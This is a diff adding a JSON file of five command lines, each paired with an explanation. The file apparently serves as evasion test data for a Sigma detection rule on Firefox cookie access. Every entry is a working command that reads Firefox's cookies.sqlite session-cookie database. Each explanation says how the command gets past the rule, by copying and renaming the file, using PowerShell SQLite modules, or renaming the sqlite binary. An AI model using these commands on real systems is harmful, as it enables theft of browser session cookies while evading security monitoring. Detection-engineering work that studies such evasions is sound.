@@ -1,0 +1,22 @@
+[
+  {
+    "output": "cmd.exe /c copy \"%APPDATA%\\Mozilla\\Firefox\\Profiles\\.default-release\\cookies.sqlite\" %TEMP%\\temp_data.db && sqlite3.exe %TEMP%\\temp_data.db \"SELECT * FROM moz_cookies;\"",
+    "explanation": "By copying the target database file to a new location with a different filename (e.g., temp_data.db) before executing sqlite3.exe on it, the command line will not contain the strings 'cookies.sqlite' or 'places.sqlite', thus successfully evading the 'selection_firefox' condition."
+  },
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -Command \"Import-Module PSSQLite; Invoke-SqliteQuery -DataSource '$env:APPDATA\\Mozilla\\Firefox\\Profiles\\.default-release\\cookies.sqlite' -Query 'SELECT * FROM moz_cookies'\"",
+    "explanation": "By utilizing PowerShell and a SQLite parsing module (like PSSQLite) to interact with the database instead of the standalone sqlite3.exe binary, the activity avoids the 'selection_sql' condition entirely, as neither the 'Product' nor the 'Image' metadata will match the rule's criteria."
+  },
+  {
+    "output": "copy \"%APPDATA%\\Mozilla\\Firefox\\Profiles\\xxxxx.default-release\\cookies.sqlite\" \"%TEMP%\\c.db\" && sqlite3.exe \"%TEMP%\\c.db\" \"SELECT * FROM moz_cookies;\"",
+    "explanation": "The Sigma rule relies on the exact strings 'cookies.sqlite' or 'places.sqlite' appearing in the command line. By first copying the database file to a temporary file with a different name (e.g., c.db) and then querying the copy, the selection_firefox condition is never triggered."
+  },
+  {
+    "output": "sq3.exe \"%APPDATA%\\Mozilla\\Firefox\\Profiles\\xxxxx.default-release\\cookies.sqlite\" \"SELECT * FROM moz_cookies;\"",
+    "explanation": "The rule looks for the Image ending in '\\sqlite.exe' or '\\sqlite3.exe', or the Product name being 'SQLite'. An attacker can compile their own SQLite client, rename the binary to 'sq3.exe', and strip/modify the PE metadata (Product name). This bypasses the selection_sql condition."
+  },
+  {
+    "output": "powershell -Command \"$conn = New-Object System.Data.SQLite.SQLiteConnection('Data Source=cookies.sqlite'); $conn.Open(); $cmd = $conn.CreateCommand(); $cmd.CommandText = 'SELECT * FROM moz_cookies'; $cmd.ExecuteReader()\"",
+    "explanation": "The rule specifically targets the use of the standalone SQLite command-line utility. Querying the database programmatically via PowerShell, Python, or a custom C# loader utilizing a SQLite DLL will bypass the selection_sql condition entirely since the executing process will be powershell.exe or similar, not sqlite3.exe."
+  }
+]
